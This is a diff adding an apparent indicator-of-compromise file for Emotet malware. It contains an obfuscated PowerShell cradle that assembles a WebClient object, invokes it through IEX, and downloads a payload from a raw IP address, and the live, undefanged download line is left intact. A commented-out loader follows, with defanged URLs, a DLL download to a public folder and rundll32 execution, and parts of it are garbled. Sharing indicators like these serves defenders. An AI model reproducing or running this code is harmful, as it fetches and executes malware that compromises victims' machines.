@@ -1,0 +1,37 @@
+Latest IOCs of Emotet Malware
+
+"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"  -noexit 
+
+$c1='(New-Object Net.We'.replace('', ''); 
+$c4='bClient).Downlo'.replace('', ''); 
+$c3=''.replace('', '');
+$JI=($c1,$c4,$c3 -Join '');
+I`E`X $JI|I`E`X 
+
+New-Object Net.WebClient.DownloadString('http://92.255.57.195/sec/se1.png')
+
+#$path ='C[.] Users\ Public\ Documents\sed[.] d11';
+#$url1 = 'hxxp://seven-lines[.] com/wo-includes/ORGNP4XUSR2Ps/1';
+#$ur12 = 'hxxp://quranthemepark[.]com/wp-content/Oalz2gBtm/';
+#$ur13 = 'hxxp://vnvoron[.] xvz/cgi-bin/AimOYIHrf?i/1';
+#$ur14 = 'hxxps://kaartinen[.]org/wp-admin/VErvaxko15alxt22s/1';
+#$urls = 'hxxp://hrlinkedasia[.] com/b/1B2L1';
+#$url6 = 'hxxp://ntu$t-arch-2021-api[.]monoame[.] com/licenses/e74DI:6t/1';
+#$ur17 = 'hxxp: //customtshirt[.]sogoflowers[.]com/cgi-bin/wzEOjYNaL';
+#$ur18 = 'hxxp//al rumavuh[.] com/V7cPVVEy /97MNaV/1';
+#$url19= 'hxxp: //wordpress15, aftershipdemo,com/wordpress/fGmhYvSkeBuJu/!';
+#$url10 ='hxxps://vihgov[.] vip/images/yQ8scBrDeQREHL';
+#web = New-object net[.]webclient:
+#$urls
+#"$ur11, $url2, $url3, $url4, $ur15, $url6, $url7, $url8, $ur19, $url10"[.]split (", ") :
+#foreach ($url in $urls) {
+#try {
+#  $web[.] Downloadfile (Surl, Spath);
+#  if ((Get-Item Spath) [.] Length -ge 30000) {
+#  [Diagnostics[.] Process]:
+#    break;
+#    }
+#  }
+#catcht{}
+#}
+#sleep -s 4cmd /c C:\Windows\syswow64\rundll32[.]exe 'C: \Users\ Public\Documents\ssd[.]dll',Anystring;
